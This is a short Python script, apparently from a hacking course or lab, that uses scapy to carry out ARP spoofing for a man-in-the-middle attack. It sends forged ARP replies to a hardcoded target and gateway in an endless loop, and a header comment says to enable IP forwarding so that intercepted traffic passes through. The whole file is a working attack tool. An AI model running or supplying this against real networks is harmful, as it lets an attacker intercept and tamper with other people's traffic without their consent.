# To be able to be Man in the middle, we need to allow data to flow through our system with port forwarding.
# use command: echo 1 > /proc/sys/net/ipv4/ip_forward
import scapy.all as scapy
import argparse
import time


def get_mac(ip_addr):  # finds the MAC addr of the target computer
    arp_request = scapy.ARP(pdst=ip_addr)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answer_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answer_list[0][1].hwsrc  # return the mac addr.


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # op flag: 1 = arp request, 2 = arp response
    # hwdst is the MAC addr of the target
    print("sending packet to: " + target_mac + " with ip " + target_ip)

    scapy.send(packet)


def main(target_ip, spoof_ip): #executes man-in-the-middle
    while True:
        spoof(target_ip,spoof_ip)
        spoof(spoof_ip,target_ip)
        time.sleep(2)

main("10.0.2.15","10.0.2.1")